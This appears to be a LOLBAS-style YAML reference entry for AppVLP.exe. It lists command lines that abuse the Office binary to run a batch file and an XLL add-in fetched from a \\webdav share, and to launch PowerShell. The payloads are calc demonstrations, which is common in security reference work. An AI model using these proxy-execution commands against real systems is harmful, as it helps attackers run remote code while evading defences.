---
Name: Appvlp.exe
Description: Execute
Author: ''
Created: '2018-05-25'
Categories: []
Commands:
  - Command: AppVLP.exe \\webdav\calc.bat
    Description: Executes calc.bat through AppVLP.exe
  - Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)"
    Description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
  - Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"
    Description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
Full Path:
  - C:\Program Files\Microsoft Office\root\client\appvlp.exe
  - C:\Program Files (x86)\Microsoft Office\root\client\appvlp.exe
Code Sample: []
Detection: []
Resources:
  - https://github.com/MoooKitty/Code-Execution
  - https://twitter.com/moo_hax/status/892388990686347264
Notes: Thanks to fab - @0rbz_ (No record), Will - @moo_hax (Code Execution)
